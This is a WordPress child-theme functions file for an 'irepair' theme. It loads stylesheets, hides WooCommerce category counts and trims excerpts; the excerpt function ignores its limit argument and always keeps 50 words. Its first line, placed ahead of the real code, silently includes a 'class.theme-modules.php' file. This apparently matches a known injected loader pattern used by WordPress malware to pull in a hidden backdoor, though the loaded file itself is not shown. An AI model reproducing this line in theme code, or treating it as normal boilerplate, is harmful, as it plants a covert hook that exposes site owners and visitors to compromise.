<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/************* LOAD REQUIRED SCRIPTS AND STYLES *************/
function pix_child_load_css(){
    wp_enqueue_style('style', get_stylesheet_uri() );
    wp_enqueue_style('irepair', get_template_directory_uri() . '/style.css' );
}
add_action('wp_enqueue_scripts', 'pix_child_load_css'); //Load All Css

//убираем количество в категориях
add_filter('woocommerce_subcategory_count_html','remove_count');

function remove_count(){
 $html='';
 return $html;
}

function irepair_limit_words2($string, $word_limit) {

	// creates an array of words from $string (this will be our excerpt)
	// explode divides the excerpt up by using a space character

	$words = explode(' ', $string);

	// this next bit chops the $words array and sticks it back together
	// starting at the first word '0' and ending at the $word_limit
	// the $word_limit which is passed in the function will be the number
	// of words we want to use
	// implode glues the chopped up array back together using a space character
 	if($string == "")
		return '';
	else
		return implode(' ', array_slice($words, 0, 50)).'>>>';
}
add_filter( 'irepair_limit_words', 'irepair_limit_words2' );